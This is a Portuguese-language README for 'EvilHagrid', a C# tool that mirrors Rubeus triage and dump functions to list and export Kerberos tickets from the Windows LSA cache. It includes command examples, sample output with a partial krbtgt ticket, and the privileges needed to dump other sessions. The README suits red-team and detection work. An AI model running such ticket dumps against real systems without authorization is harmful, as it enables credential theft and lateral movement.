<img width="1672" height="941" alt="Hacker sombrio EVIL HAGRID" src="https://github.com/user-attachments/assets/edca5a68-5d84-4228-ab2c-9fd41d0e3444" />


EvilHagrid é uma reimplementação enxuta em C# de duas funcionalidades do [Rubeus](https://github.com/GhostPack/Rubeus), com nomenclatura temática do universo Harry Potter. Roda em Windows e extrai tickets Kerberos do cache da LSA via `LsaCallAuthenticationPackage`.

## Spells

```
EvilHagrid accio [--service <text>]
EvilHagrid aparecium --luid <0x...> [--service <text>] [--nowrap]
```

### `accio` — enumerar tickets (triage)

Lista os tickets Kerberos das sessões de logon disponíveis, incluindo o LUID de cada sessão. Quando rodando com `SeTcbPrivilege` (SYSTEM), enumera todas as sessões via `LsaEnumerateLogonSessions`. Sem esse privilégio, exibe apenas a sessão atual.

```
PS> .\EvilHagrid.exe accio

LUID     | Client                     | Service                      | Expires (UTC)        | Encryption              | Flags
---------+----------------------------+------------------------------+----------------------+-------------------------+-----------
0x17b7e0 | andre@CORP.LOCAL           | krbtgt/CORP.LOCAL@CORP.LOCAL | 2026-11-05 22:33:23Z | AES256-CTS-HMAC-SHA1-96 | 0x40E10000

1 ticket(s) enumerated.
```

**Opções:**
- `--service <text>` — filtra tickets cujo service name ou realm contenha o texto (case-insensitive)

### `aparecium` — dump de ticket (base64 kirbi)

Para um LUID obtido via `accio`, recupera o ticket encodado (`KerbRetrieveEncodedTicketMessage`) e imprime o base64 do `KRB_CRED` — idêntico ao output do `Rubeus dump`.

```
PS> .\EvilHagrid.exe aparecium --luid 0x17b7e0 --service krbtgt

  [*] LUID          : 0x17b7e0
      UserName      : andre@CORP.LOCAL
      ServiceName   : krbtgt/CORP.LOCAL@CORP.LOCAL
      StartTime     : 2026-11-05 12:33:23Z
      EndTime       : 2026-11-05 22:33:23Z
      Flags         : 0x40E10000

    Base64EncodedTicket :

      doIFCDCCBQSgAwIBBaEMGwpDT1JQLkxPQ0FMoh8w
      HaADAgECoRYwFBsGa3JidGd0GwpDT1JQLkxPQ0FM
      ...

[*] Dumped 1 ticket(s).
```

Com `--nowrap`, o base64 é impresso em uma única linha — útil para passar diretamente para outras ferramentas:

```
PS> .\EvilHagrid.exe aparecium --luid 0x17b7e0 --service krbtgt --nowrap

    Base64EncodedTicket :

      doIFCDCCBQSgAwIBBaEMGwpDT1JQLkxPQ0FMoh8wHaADAgECoRYwFBsGa3JidGd0GwpDT1JQLkxPQ0FM...
```

**Opções:**
- `--luid <0x...>` — LUID hexadecimal da sessão alvo (obrigatório)
- `--service <text>` — filtra quais tickets da sessão serão dumpados
- `--nowrap` — imprime o base64 em uma única linha (útil para pipar em outras ferramentas)

## Requisitos de privilégio

| Operação | Privilégio necessário |
|---|---|
| `accio` — sessão atual | Nenhum |
| `accio` — todas as sessões | `SeTcbPrivilege` (SYSTEM) |
| `aparecium` — sessão atual | Nenhum |
| `aparecium` — outra sessão | `SeTcbPrivilege` (SYSTEM) |

Quando rodando como admin sem `SeTcbPrivilege`, ambos os comandos operam normalmente na sessão atual. O dump de outra sessão requer impersonation de SYSTEM.

## Build

```bash
dotnet build src/EvilHagrid/EvilHagrid.csproj --configuration Release
# binário em: src/EvilHagrid/bin/Release/net6.0/EvilHagrid.exe
```

Requer .NET SDK 6.0+. O binário é self-contained por padrão no diretório de output.

## Arquitetura

```
src/EvilHagrid/
├── Cli/
│   ├── Incantation.cs     # Parser de argumentos + enum SpellName
│   └── SpellBook.cs       # Dispatcher principal
├── Domain/
│   ├── ScrollRecord.cs    # Metadata de ticket (triage)
│   └── KirbiRecord.cs     # Ticket encodado + base64 (dump)
├── Ministry/
│   └── MinistryLedger.cs  # Toda interação com LSA via P/Invoke
├── Rendering/
│   └── GreatHallTable.cs  # Renderização de tabela ASCII
└── Spells/
    ├── TriageCharm.cs     # Lógica de output do accio
    └── DumpCharm.cs       # Lógica de output do aparecium
```

## Branches

- `main` — implementação C# atual
- `unstable` — implementação Rust anterior (arquivada)

---

> Use apenas em sistemas onde você possui autorização explícita para inspecionar tickets Kerberos.
